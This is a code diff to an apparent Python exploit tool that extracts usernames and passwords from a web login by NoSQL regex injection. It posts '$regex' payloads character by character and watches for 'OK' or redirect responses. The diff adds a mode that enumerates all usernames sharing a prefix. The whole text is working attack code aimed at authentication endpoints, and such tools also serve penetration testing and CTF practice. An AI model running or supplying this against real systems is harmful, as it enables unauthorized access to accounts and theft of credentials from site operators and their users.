@@ -15,7 +15,7 @@ except:
     curses = None
 
 
-def check(pattern, spot, q, url):
+def check(pattern, spot, q, url, iterate=False):
     headers={'content-type': 'application/x-www-form-urlencoded'}
     for c in string.printable:
         if c in ['\t', '\r', '\n', '|', '^', '\\', '`']:
@@ -28,8 +28,10 @@ def check(pattern, spot, q, url):
         q.put((c, spot))
         r = requests.post(url, data = payload, headers = headers, verify = False, allow_redirects = False)
         if 'OK' in r.text or r.status_code == 302:
-            q.put((-1, spot))
-            return
+            if not iterate:
+                q.put((-1, spot))
+                return
+            q.put((-2, spot, c))
     q.put((' ', spot))
     q.put((-1, spot))
 
@@ -44,19 +46,20 @@ def gen_patterns(n, base, partial):
     return patterns
 
 
-def run_patterns(patterns, stdscr, length, url, partial, line):
+def run_patterns(patterns, stdscr, length, url, partial, line, iterate=False):
     # Adjust our content type
     procs = []
     q = Queue()
+    iter_spots = []
     word = [''] * length
     for i,l in enumerate(partial):
         if stdscr is not None:
-            stdscr.addch(1, i, l)
+            stdscr.addch(line, i, l)
         word[i] = l
     offset = length - len(patterns)
     for x, pattern in enumerate(patterns):
         # print(x, pattern)
-        p = Process(target=check, args=(pattern, x+offset, q, url))
+        p = Process(target=check, args=(pattern, x+offset, q, url, iterate))
         p.start()
         procs.append(p)
 
@@ -65,6 +68,9 @@ def run_patterns(patterns, stdscr, length, url, partial, line):
         info = q.get()
         if info[0] == -1:
             length -= 1
+            continue
+        elif info[0] == -2:  # found spot iterating
+            iter_spots.append(info[2])
             continue
         word[info[1]] = info[0]
         if stdscr is not None:
@@ -77,7 +83,38 @@ def run_patterns(patterns, stdscr, length, url, partial, line):
             stdscr.addch(line, i, l)
         stdscr.addch(line, len(word), ' ')
         stdscr.refresh()
+    if iterate:
+        return iter_spots
     return ''.join(word)
+
+
+def iterate_usernames(args, payload, stdscr):
+    base_len = len(args.username) + 1
+    usernames = []
+    patterns = gen_patterns(base_len, payload, args.username)
+    spots = run_patterns(patterns, stdscr, base_len, args.url, args.username, 0, iterate=True)
+    if not spots:
+        return "no usernames found", ""
+    bases = []
+    for spot in spots:
+        bases.append(args.username + spot)
+    save = bases
+    for x in range(base_len, args.ul):
+        base_len += 1
+        next = []
+        for i, user in enumerate(bases):
+            patterns = gen_patterns(base_len, payload, user)
+            spots = run_patterns(patterns, stdscr, base_len, args.url, user, i, iterate=True)
+            if not spots:
+                usernames.append(user)  # no returns found, user is complete
+            else:
+                for spot in spots:
+                    next.append(user + spot)
+        if not next:
+            return usernames, ""
+        bases = next
+        save = bases
+    return save, ""  # we hit max username length before hitting no matches found in a round
 
 
 epilog='''
@@ -117,17 +154,22 @@ def main(stdscr=None):
         stdscr.clear()
     line = 0
     params = '&'.join(args.params)
-    if len(args.username) < args.ul:  # partial or no username
+
+    if len(args.username) == args.ul:
+        username = args.username
+    elif len(args.username) > args.ul:
+        print("given username is longer than username max length\n")
+        return "", ""
+    else:  # partial or no username
         line += 1
         base = '{}&username[$regex]={{}}&password[$regex]=^.*'.format(params)
-    
-    if len(args.username) != args.ul:
-        patterns = gen_patterns(args.ul, base, args.username)
-        username = run_patterns(patterns, stdscr, args.ul, args.url, args.username, line).rstrip()
-        if stdscr is None:
-            print("username:[{}]".format(username))
-    else:
-        username = args.username
+        if not args.iterate:
+            patterns = gen_patterns(args.ul, base, args.username)
+            username = run_patterns(patterns, stdscr, args.ul, args.url, args.username, line).rstrip()
+            if stdscr is None:
+                print("username:[{}]".format(username))
+        else:
+            return iterate_usernames(args, base, stdscr)
 
     line += 1
     base = '{}&username={}&password[$regex]={{}}'.format(params, username)
